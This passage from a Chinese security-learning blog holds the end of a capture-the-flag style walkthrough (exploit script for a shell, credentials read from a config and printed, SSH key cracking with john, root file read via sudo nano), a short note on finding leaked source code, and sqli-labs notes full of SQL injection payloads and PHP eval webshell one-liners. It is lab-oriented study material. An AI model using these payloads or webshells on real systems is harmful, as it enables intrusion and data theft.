+<p>执行：./47691.sh <a href="http://10.10.10.171/ona/" target="_blank" rel="noopener">http://10.10.10.171/ona/</a> 拿到 shell<br>（我把 47691 改成 yichen  了 ，另外会有延迟，执行之后稍等一下）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581997804125-3ace5113-1d10-419e-8e8a-4b5b3dd31046.png#align=left&display=inline&height=262&name=image.png&originHeight=371&originWidth=670&size=35760&status=done&style=none&width=474" alt="image.png"></p>
+<p>但是权限比较低，当前用户是：www-data，没法执行  cd  命令</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581998587762-2362b131-0ec8-45c3-a967-bad22c4baac2.png#align=left&display=inline&height=90&name=image.png&originHeight=75&originWidth=120&size=2895&status=done&style=none&width=144" alt="image.png"></p>
+<p>使用 ls，尝试去找目录</p>
+<p>在 /var/www/  目录下使用 ls -la  查看文件信息，可以发现有个用户是 jimmy<br>-a  列出所有文件，包括 .  开头的<br>-l  除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582011267575-98e42bd0-eee8-4e8a-a969-1401ca7a317c.png#align=left&display=inline&height=130&name=image.png&originHeight=176&originWidth=707&size=33355&status=done&style=none&width=522" alt="image.png"></p>
+<p>在 /var/www/ona/config/  发现 config.inc.php<br>里面发现 dbconffile  的目录</p>
+<p>可能需要了解一下 linux 各个目录是干啥的，这样才能知道要用到什么<br>会在   杂项   知识库补充，然后在下面做个超链接</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582010275466-8fd9e6ec-9317-4f33-a68f-8ec4b0835598.png#align=left&display=inline&height=324&name=image.png&originHeight=487&originWidth=918&size=99151&status=done&style=none&width=610" alt="image.png"></p>
+<p>找到数据库的用户名和密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582010583277-2beb8fab-a925-461c-8799-38045a672092.png#align=left&display=inline&height=423&name=image.png&originHeight=475&originWidth=593&size=55364&status=done&style=none&width=528" alt="image.png"></p>
+<p>使用 n1nj4W4rri0R!  作为密码，使用  Jimmy  作为用户名  ssh 登录成功</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582011072641-3c2ef0ae-6791-4a13-9ce8-542c0270a8d6.png#align=left&display=inline&height=425&name=image.png&originHeight=628&originWidth=901&size=110787&status=done&style=none&width=610" alt="image.png"></p>
+<p>可以看到  main.php  他会输出 joanna 的 .ssh  的 id_rsa</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582011566221-66e38fc8-8b3d-4114-9a54-00490b62e24b.png#align=left&display=inline&height=206&name=image.png&originHeight=318&originWidth=902&size=65104&status=done&style=none&width=584" alt="image.png"></p>
+<p>但是当我们去  curl  的时候没有输出，可能并不是在默认的 80  口，使用 netstat -tulpn  查看一下</p>
+<p><strong>netstat  各个参数解释</strong><br>-a (all)显示所有选项，默认不显示 LISTEN 相关<br>-t (tcp)仅显示 tcp 相关选项<br>-u (udp)仅显示 udp 相关选项<br>-n 拒绝显示别名，能显示数字的全部转化成数字<br>-l 仅列出有在 Listen (监听) 的服務状态<br>-p 显示建立相关链接的程序名<br>-r 显示路由信息，路由表<br>-e 显示扩展信息，例如 uid 等<br>-s 按各个协议进行统计<br>-c 每隔一个固定时间，执行该 netstat 命令</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582011779554-f2e2e55e-65cd-4f55-80eb-fbe80b406211.png#align=left&display=inline&height=464&name=image.png&originHeight=660&originWidth=902&size=111623&status=done&style=none&width=634" alt="image.png"></p>
+<p>猜测运行在 52846  上，所以  curl <a href="http://127.0.0.1:52846/main.php" target="_blank" rel="noopener">http://127.0.0.1:52846/main.php</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582012007465-50d105be-0825-4088-ace6-bce10aa236a1.png#align=left&display=inline&height=613&name=image.png&originHeight=768&originWidth=729&size=305146&status=done&style=none&width=582" alt="image.png"></p>
+<p>同时了解一下  curl  这个功能，同样在   杂项   知识库记录</p>
+<p>讲这个密钥保存出来：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582012472228-ca92162b-4c11-4485-b8f5-06422930a710.png#align=left&display=inline&height=407&name=image.png&originHeight=700&originWidth=679&size=284467&status=done&style=none&width=395" alt="image.png"></p>
+<p>然后使用：<br><code>python /usr/share/john/ssh2john.py mi &gt; sshjohn</code>    将保存出来的 mi  转换成  john  格式</p>
+<p>ssh2john.py  的作用就是把 ssh  密钥   改成  john  可以识别的格式</p>
+<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt sshjohn</code>    使用 john 爆破 –wordlist 指定字典</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582012541561-5eb601a2-46cb-419d-b496-ece74aca28b4.png#align=left&display=inline&height=298&name=image.png&originHeight=472&originWidth=911&size=129853&status=done&style=none&width=576" alt="image.png"></p>
+<p>然而这一个并不是  ssh  连接的密码，而是使用密钥进行登录时的密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582012818944-cac25165-590f-4e63-81b4-6b57d0cfd349.png#align=left&display=inline&height=390&name=image.png&originHeight=618&originWidth=898&size=114924&status=done&style=none&width=566" alt="image.png"></p>
+<p>这样就登陆了 joanna，在当前目录下有个  user.txt  里面存着  flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582012979518-36306e03-d09b-4550-8fbd-4f601a4dece9.png#align=left&display=inline&height=133&name=image.png&originHeight=115&originWidth=341&size=15459&status=done&style=none&width=395" alt="image.png"></p>
+<p>使用 sudo -l  可以发现，下面两个不用密码就可以以  root  权限执行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582013157981-74b7e60f-5f82-4208-adf6-45247d4a815f.png#align=left&display=inline&height=142&name=image.png&originHeight=202&originWidth=899&size=37190&status=done&style=none&width=632" alt="image.png"></p>
+<p>使用 sudo /bin/nano /opt/priv  打开，然后使用 ctrl+R  来读取 /root/root.txt  的内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582013427282-14c3e779-0851-499a-8372-ac575fc0b539.png#align=left&display=inline&height=453&name=image.png&originHeight=753&originWidth=924&size=52480&status=done&style=none&width=556" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582013566814-4c1789fb-271a-4f05-b487-cc12eb245d6f.png#align=left&display=inline&height=69&name=image.png&originHeight=84&originWidth=727&size=14019&status=done&style=none&width=594" alt="image.png"></p>
+<p>成功读取：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582013639432-2fbd7cbf-f18b-4f01-9e03-67cc5f226633.png#align=left&display=inline&height=117&name=image.png&originHeight=132&originWidth=565&size=10096&status=done&style=none&width=502" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/18/kn5txd/" data-id="ckco53qbt000w8ou9bd5509jl" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-ynp7pa" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/14/ynp7pa/">源码获取、fuzz思路</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/14/ynp7pa/" class="article-date">
+  <time datetime="2020-02-14T06:53:23.000Z" itemprop="datePublished">2020-02-14</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h1><p><a href="https://blog.csdn.net/super_yiang/article/details/82491310" target="_blank" rel="noopener">https://blog.csdn.net/super_yiang/article/details/82491310</a></p>
+<h2 id="右键查看源代码"><a href="#右键查看源代码" class="headerlink" title="右键查看源代码"></a>右键查看源代码</h2><p>最简单的，右键查查看</p>
+<h2 id="代码压缩包泄露"><a href="#代码压缩包泄露" class="headerlink" title="代码压缩包泄露"></a>代码压缩包泄露</h2><p>有些站点的管理员将源码备份成压缩包的格式，却放在了 Web 目录下，攻击者访问该压缩包的时候就会下载该压缩包。<br>PS：常见后缀 ： .zip .rar .tar.gz .7z</p>
+<h2 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title=".git 源码泄露"></a>.git 源码泄露</h2><p>从 git 仓库下载代码的时候，会在本地生成一个.git 隐藏文件夹(存放代码的变更记录)，导致攻击者可以使用该文件夹下的信息拿到代码。<br>PS：利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p>
+<h2 id="DS-Store-泄漏"><a href="#DS-Store-泄漏" class="headerlink" title=".DS_Store 泄漏"></a>.DS_Store 泄漏</h2><h2 id="SVN-代码泄露"><a href="#SVN-代码泄露" class="headerlink" title="SVN 代码泄露"></a>SVN 代码泄露</h2><h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><p>rebots.txt</p>
+<h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><p>index.php.swp<br>index.php.bak</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/14/ynp7pa/" data-id="ckco53qbp000n8ou9chn0bv1m" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-wgbfv8" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/07/wgbfv8/">sqli-labs记录</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/07/wgbfv8/" class="article-date">
+  <time datetime="2020-02-07T11:57:07.000Z" itemprop="datePublished">2020-02-07</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>phpstudy 的版本会影响使用，使用默认的版本就行 php-5.4.45 + Apache</p>
+<h1 id="1-4-预备知识（基于错误的注入）"><a href="#1-4-预备知识（基于错误的注入）" class="headerlink" title="1~4 预备知识（基于错误的注入）"></a>1~4 预备知识（基于错误的注入）</h1><h2 id="几个常用函数"><a href="#几个常用函数" class="headerlink" title="几个常用函数"></a>几个常用函数</h2><ol>
+<li>version()——MySQL 版本</li>
+<li>user()——数据库用户名</li>
+<li>database()——数据库名</li>
+<li>@@datadir——数据库路径</li>
+<li>@@version_compile_os——操作系统版本</li>
+</ol>
+<h2 id="系统表介绍"><a href="#系统表介绍" class="headerlink" title="系统表介绍"></a>系统表介绍</h2><p>SCHEMATA 表：提供了关于数据库的信息。<br>TABLES 表：给出了关于数据库中的表的信息。<br>COLUMNS 表：给出了表中的列信息。<br>STATISTICS 表：给出了关于表索引的信息。</p>
+<h2 id="字符连接函数"><a href="#字符连接函数" class="headerlink" title="字符连接函数"></a>字符连接函数</h2><ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+</ol>
+<h2 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h2><p>or 1=1–+<br>‘ or 1=1–+<br>“ or 1=1–+<br>) or 1=1–+<br>‘) or 1=1–+<br>“) or 1=1–+<br>“)) or 1=1–+<br>一般情况代码为：<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>加入测试语句后：’ or 1=1–+<br>$sql=”SELECT * FROM users WHERE id=’$id’ or 1=1–+’ LIMIT 0,1”;</p>
+<p>union 操作符：<br>用于合并两个或多个 select 语句<br>SELECT column_name(s) FROM table_name1<br>UNION<br>SELECT column_name(s) FROM table_name2<br>UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br>列的顺序必须相同</p>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1:"></a>less-1:</h3><p>先添加单引号，报错，证明有 sql 漏洞<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1<br><strong>‘</strong>‘1’’ LIMIT 0,1<strong>‘</strong></p>
+<p>尝试’ or 1=1–+<br>–+是为了把后面的注释掉<br>‘order by 4–+得到列数<br>-1’union select 1,2,3–+<br>显示出 2,3，说明这里可以回显<br>爆库：<br>union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>查询 schema_name（库名）并放到一个组里<br>从 information_schema.schemata（存放所有数据库名的表）里面<br>爆表：<br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br>查询 table_name（表名）的信息放在一个组里<br>从 information_schema.tables（存放所有表名的地方）中 table_schema=’security’的地方<br>爆列：<br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br>查询 column_name（列名）的信息，放在一个组里<br>从 information_schema.coulmns（存放所有列名的表）中 table_name=’users’的地方<br>爆数据：<br>union select 1,username,password from users where id=2–+<br>从 users 表中的 id=2 的地方查询 username 和 password 的内容</p>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h3><p>单引号报错<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=$id LIMIT 0,1<br>‘’ LIMIT 0,1’<br>查询代码使用了整数<br>可以使用不加单引号的 or 1=1</p>
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3:"></a>less-3:</h3><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1<br>‘’1’’) LIMIT 0,1’<br>可以使用’)  或)  把前面闭合</p>
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4:"></a>less-4:</h3><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1<br>说明查询语句是：<br>SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1<br>‘“1””) LIMIT 0,1’<br>可以使用：”)闭合就行了</p>
+<h1 id="5-6-背景知识-2："><a href="#5-6-背景知识-2：" class="headerlink" title="5~6 背景知识 2："></a>5~6 背景知识 2：</h1><p>盲注：数据不能回显到前端页面，我们需要利用一些方法进行判断或者尝试</p>
+<h2 id="基于布尔-SQL-盲注"><a href="#基于布尔-SQL-盲注" class="headerlink" title="基于布尔 SQL 盲注"></a>基于布尔 SQL 盲注</h2><p>———-构造逻辑判断</p>
+<p>（知识）SQL 注入截取字符串常用函数：<br><a href="http://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5504374.html</a><br>1.mid(column_name,start[,length])<br>column_name——要提取的字段<br>start——规定开始位置<br>length——要返回的字符数， 如果省略，则 mid()  函数返回剩余文本</p>
+<p>例如 str=”123456”<br>mid(str,2,1)  —–&gt;结果为 2</p>
+<p>mid(database(),1,1)&gt;’a’，查看数据库的第一位，<br>mid(database(),2,1)&gt;’a’，产看数据库的第二位，</p>
+<p>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处 column_name 参数可以为 sql 语句，可自行构造 sql 语句进行注入</p>
+<p>2.substr(string,start,length)</p>
+<p>substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，<br>substr(DATABASE(),2,1)&gt;’a’,查看数据库名第二位，<br>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处 string 参数可以为 sql 语句，可自行构造 sql 语句进行注入。</p>
+<p>3.left(string,n)</p>
+<p>left(database(),1)&gt;’a’,查看数据库名的第一位<br>left(database(),2)&gt;’a’,查看数据库名的第二位</p>
+<p>再用 ord(上面的函数)&gt;数字（ASCII 码值）<br>ord(mid(database(),1,1))&gt;144</p>
+<p>检查 database()的第一位 ASCⅡ 码是否大于 144</p>
+<p>regexp 正则注入：<br><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a><br>用法：select user() regexp ‘^r’;<br>检验是否存在 r 中，在 MySQL 中会显示 1<br>但是在网页上可以用<br>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
+<p>limit 只是作用于前面的 security 的，想测试别的表名只是改一下表名就行</p>
+<p>like 匹配注入<br>select user() like ‘ro%’<br>beecheck()重复执行</p>
+<p>笛卡尔积：<br>如果 user 表中有 4 条数据<br>select count(*) from user A, user B<br>得：16</p>
+<h2 id="基于报错的-SQL-盲注"><a href="#基于报错的-SQL-盲注" class="headerlink" title="基于报错的 SQL 盲注"></a>基于报错的 SQL 盲注</h2><p>——构造 payload 让信息通过错误提示回显出来</p>
+<p>MySQL 的一个漏洞可以让信息显示出来</p>
+<p>Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;<br>简化为<br>select count(</em>) from information_schema.tables group by concat(version(), floor(rand(0)*2))</p>
+<p>如果关键的表被禁用了，可以用：<br>select count(<em>) from (select 1 union select null union<br>select !1) group by concat(version(),floor(rand(0)</em>2))</p>
+<p>如果 rand 被禁用了，可以用：<br>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</p>
+<p>select exp(~(select * from(select user())a))  //double 数值类型超出范围<br>参考文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
+<p>select !(select * from (select user())x)   //bigint 超出范围<br>参考文章<br><a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
+<p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>mysql 重复特性，此处重复了 version，所以报错</p>
+<p>•基于时间的 SQL 盲注——延时注入</p>
+<p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句，条件为假，执行 sleep</p>
+<p>select sleep (find_in_set(mid(@@version,1,1),’0,1,2,3,4,5,6,7,8,9,.’));<br>在 0-9 之间寻找版本号的第一位</p>
+<h3 id="less-5-6"><a href="#less-5-6" class="headerlink" title="less-5~6:"></a>less-5~6:</h3><p>less-5<br>布尔盲注：<br>构造?id=1  发现返回 you are in….不会返回信息了，说明是盲注</p>
+<p>‘and left (version(),1)=5%23（测试数据库版本第一位是不是 5）<br>返回正常,前面那个单引号是为了闭合变量 id</p>
+<p>‘and length(database())=8%23<br>测试数据库长度</p>
+<p>‘and left(database(),1)&gt;’a’–+<br>测试数据库第一位是否大于 a</p>
+<p>‘and left(database(),2)&gt;’sa’–+<br>测试数据库前两位是否大于 sa</p>
+<p>‘and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80–+</p>
+<p>检测数据表的第一个字符是否大于 ascii 80</p>
+<p>‘and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80–+<br>检测数据表的第二个字符是否大于 ascii80<br>此处 limit 限制的仍然是表的第几个，所以希望查看别的表的时候可以更改 limit,即，第二个表测试的时候可改为 limit 1,1</p>
+<p>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^us[a-z]’ limit 0,1)–+<br>检测 users 表中是否含有带有 us 的列名</p>
+<p>这里 select 1 from…..表里如果有记录，就显示 1<br>简单理解就是不查询具体列，只要有值就显示 1</p>
+<p>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+<br>检测表 users 中是否含有 username 的列名</p>
+<p>利用 ord()和 mid()获取 users 表内容<br>‘ and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68–+<br>获取表中 username 第一行第一个字段值 ascii 与 68 比较</p>
+<p>基于错误的盲注<br>固定格式                                                       想要查询的内容<br>‘ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a–+<br>当在一个聚合函数如 count()函数后面，如果使用分组语句如 group by 就会把查询的一部分以错误的形式显示出来</p>
+<p>基于时间的盲注</p>
+<p>‘and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
+<p>当条件不成立，即错误时会有 5 秒钟的延时<br>关于 if 语句： if(condition,ture,false)  若条件正确，执行 ture,不正确执行 false<br>‘and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80,1,sleep(5))–+</p>
+<p>‘and if(ascii(substr((select column_name from information_schema.columns where table_name=’users’),1,1))&gt;80,1,sleep(5))–+<br>显示子查询由多行，还是不要用延时注入了，用正则表达式吧<br>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+<br>‘ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+</p>
+<p>less-6<br>$id = ‘“‘.$id.’”‘;<br>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>对传参进行了设置，闭合语句换了，把第五关的单引号换成双引号</p>
+<h1 id="背景知识-3："><a href="#背景知识-3：" class="headerlink" title="背景知识 3："></a>背景知识 3：</h1><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串<br>使用条件： 1.使用 and (selectcountfrom mysql.user)&gt;0/*若返回正常，则说明有权限 2.读取的文件必须在服务器上 3.必须提供完整路径 4.文件必须小于 max_allowed_packet</p>
+<p>Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))<br>利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。</p>
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>Explain：”char(99,58,47,98,111,111,116,46,105,110,105)” 就是”c:/boot.ini”的 ASCII 代码</p>
+<p>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>Explain：”c:/boot.ini”的 16 进制是”0x633a2f626f6f742e696e69”</p>
+<p>-1 union select 1,1,1,load_file(c:\boot.ini)<br>Explain:路径里的/用 \代替</p>
+<p>文件导入到数据库<br>当你具有数据库的权限时，可以将系统文件利用 load data infile 导入到数据库中<br>实例：<br>load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’ lines terminated by ‘\n’</p>
+<p>把/tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符</p>
+<p>SELECT…..INTO OUTFILE ‘file_name’<br>把被选择的行写入一个文件中必须有 file 权限<br>一般有两种形式<br>直接将 select 内容写入文件<br>Select version() into outfile”c:\phpnow\htdocs\test.php”<br>也可以把 version()换成一句话木马，在用菜刀连接</p>
+<?php @eval($_post["shadow"])?>
+
+<p>Select version() Into outfile”c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件<br>解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY</p>
+<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>首先使用 and (select count(<em>) from mysql.user)&gt;0/</em>测试是否有读写权限，若有则返回正常<br>构造注释掉’)) or 1=1–+</p>
+<p>在指定文件夹创建 uuu.txt<br><a href="http://localhost/sqli-labs-master/Less-7/?id=1%27" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=1’))UNION</a>)UNION) SELECT 1,2,3 into outfile “d:\webanquan\zkaq\WWW\sqli-labs-master\Less-7\uuu.txt”%23<br>针对无法写入<br><a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a><br><a href="https://blog.csdn.net/weixin_39631030/article/details/79873936" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39631030/article/details/79873936</a><br>无法写入是因为 MySQL 的 secure_file_priv 设置为 null，不允许读写<br>方法：打开 MySQL 的安装目录下的 my.ini，在 mysqld 模块里添加 secure_file_priv = ‘’    记得改完后重启 mysql 服务</p>
+<p>还可以用这种方法把一句话木马写进去，用菜刀连接，虽然我不能连接成功<br>‘<?php @eval($_GET["chen"])?>‘</p>
+<h3 id="less-8-10"><a href="#less-8-10" class="headerlink" title="less-8~10"></a>less-8~10</h3><p>都是用前面背景知识 3，基本都是基于时间的盲注，大致思路如下<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))–</a>+<br>说明第一位是 s （ascii 码是 115）<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))–</a>+<br>说明第一位是 e （ascii 码是 101）<br>….<br>以此类推，我们知道了数据库名字是 security<br>猜测 security   的数据表：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select table_name from information_s<br>chema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+<br>猜测第一个数据表的第一位是 e,…依次类推，得到 emails<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select table_name from information_s<br>chema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+<br>猜测第二个数据表的第一位是 r,…依次类推，得到 referers<br>…<br>再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users<br>猜测 users   表的列：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select column_name from information<br>_schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+<br>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password<br>猜测 username   的值：<br><a href="http://127.0.0.1/sqllib/Less-9/?id=1%27and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1’and</a> If(ascii(substr((select username from users limit 0,1),<br>1,1))=68,1,sleep(5))–+<br>猜测 username 的第一行的第一位<br>以此类推，我们得到数据库 username，password 的所有内容</p>
+<h3 id="less-11-12："><a href="#less-11-12：" class="headerlink" title="less-11~12："></a>less-11~12：</h3><p>post 注入<br>用户名：admin’<br>密码：111<br>报错：’111’ LIMIT 0,1’<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1111’ LIMIT 0,1’ at line 1<br>出错原因应该是 password 字段被引号包起来了，导致引号不匹配<br>select username,password from users where username=’admin’’ and password=’111’ limit 0,1</p>
+<p>构造语句  admin’ or ‘1’=’1<br>密码随意，登录成功</p>
+<p>用户名：admin’<br>密码：admin<br>报错，返回信息 ‘’admin’’ and password=’’ LIMIT 0,1’<br>可以推断出都是’username’  ‘password’  单引号分开</p>
+<p>Username：1admin’union select 1,database()#      这里不明白，1admin  前面是数字就行，把数字放后面就不行了，admin1 可能是存在这么一个用户名，没法激发后面的联合查询<br>passwd=1（任意密码）        密码随意是因为#那后面的注释掉了<br>返回数据库名称</p>
+<h3 id="less-13-14"><a href="#less-13-14" class="headerlink" title="less-13~14:"></a>less-13~14:</h3><p>先单引号测试，再根据返回的错误信息，构造语句<br>这一关是’) or 1=1–+<br>可以发现登录成功或失败只显示登录成功或失败<br>登录成功后不会显示用户名和密码，所以，需要用到盲注<br>用户名：admin’)and mid(database(),1,1)&gt;’a’#<br>密码：随意</p>
+<h3 id="less-15-16"><a href="#less-15-16" class="headerlink" title="less-15~16:"></a>less-15~16:</h3><p>盲注，简直是够了，什么错误都不显示，除了登录成功与否，只能把所有如：’    “    ‘)     ‘))      “))方法试一遍</p>
